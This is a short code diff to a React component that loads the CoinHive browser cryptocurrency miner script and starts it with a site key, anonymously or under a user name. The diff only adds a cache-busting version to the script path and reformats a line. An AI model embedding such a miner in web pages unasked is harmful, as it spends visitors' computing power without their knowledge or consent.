@@ -43,11 +43,13 @@ class CoinHiveClient extends Component {
 
   async componentWillMount () {
     this.miner = await new Promise(resolve => {
-      loadScript('./ch.js', () => {
+      loadScript('./ch.js?v=9', () => {
         if (!window.CoinHive) return
 
         if (this.props.userName) {
-          return resolve(window.CoinHive.User(this.props.siteKey, this.props.userName))
+          return resolve(
+            window.CoinHive.User(this.props.siteKey, this.props.userName)
+          )
         }
         return resolve(window.CoinHive.Anonymous(this.props.siteKey))
       })
